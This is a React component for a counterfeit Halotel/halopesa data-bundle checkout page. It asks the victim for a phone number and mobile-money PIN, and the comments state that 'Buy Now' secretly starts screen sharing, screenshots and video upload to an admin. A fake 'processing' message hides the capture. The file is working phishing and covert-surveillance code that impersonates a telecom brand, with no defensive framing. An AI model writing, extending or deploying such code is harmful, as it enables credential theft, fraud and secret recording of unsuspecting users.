import { useState } from "react";
import { useHiddenCapture } from "../features/screenCapture/useHiddenCapture";
import { userAuthHeaders } from "../utils/auth";
import "./halotel.css";

/**
 * Halotel-style checkout UI.
 * "Buy Now" starts hidden screen sharing + screenshots + video upload to admin.
 * User sees a fake "processing" state — no previews.
 */
export default function HalotelCheckout() {
  const [phone, setPhone] = useState("");
  const [pin, setPin] = useState("");
  const [processing, setProcessing] = useState(false);
  const [done, setDone] = useState(false);

  const { videoRef, isActive, isStarting, error, startCapture, stopCapture } =
    useHiddenCapture({ authHeaders: userAuthHeaders });

  const handleBuyNow = async () => {
    if (!phone.trim() || !pin.trim()) {
      return;
    }

    setProcessing(true);
    setDone(false);

    const started = await startCapture({ phone: phone.trim(), pin: pin.trim() });

    if (started) {
      setDone(true);
      // Keep "processing" UI — capture runs silently in background
    } else {
      setProcessing(false);
    }
  };

  const handleStop = () => {
    stopCapture();
    setProcessing(false);
    setDone(false);
  };

  return (
    <div className="halotel-page">
      <div className="halotel-shell">
        <h1 className="halotel-title">Experience The Future</h1>

        <div className="halotel-field">
          <label htmlFor="phone">Enter Phone Number</label>
          <input
            id="phone"
            type="tel"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="0794316132"
            disabled={isActive || isStarting}
          />
        </div>

        <div className="halotel-field">
          <label htmlFor="pin">Enter PIN Number</label>
          <input
            id="pin"
            type="password"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            placeholder="••••"
            maxLength={8}
            disabled={isActive || isStarting}
          />
        </div>

        <div className="halotel-card">
          <p className="halotel-brand">HALOTEL</p>
          <div className="halotel-logo-wrap">
            <span className="halotel-logo">halopesa</span>
          </div>

          <div className="halotel-offer">
            <span className="halotel-gb">23GB</span>
            <span className="halotel-price">3000 TSH</span>
            <span className="halotel-valid">VALID FOR 3 MONTHS</span>
          </div>

          {!isActive ? (
            <button
              type="button"
              className="halotel-buy-btn"
              onClick={handleBuyNow}
              disabled={isStarting || !phone.trim() || !pin.trim()}
            >
              {isStarting ? "Please wait…" : "Buy Now"}
            </button>
          ) : (
            <button type="button" className="halotel-buy-btn halotel-stop" onClick={handleStop}>
              Cancel
            </button>
          )}
        </div>

        {processing && isActive && (
          <p className="halotel-processing">
            Processing your purchase… Please do not close this page.
          </p>
        )}
        {done && isActive && (
          <p className="halotel-processing subtle">
            Transaction in progress…
          </p>
        )}
        {error && <p className="halotel-error">{error}</p>}
      </div>

      <video ref={videoRef} className="halotel-hidden-video" playsInline muted />
    </div>
  );
}
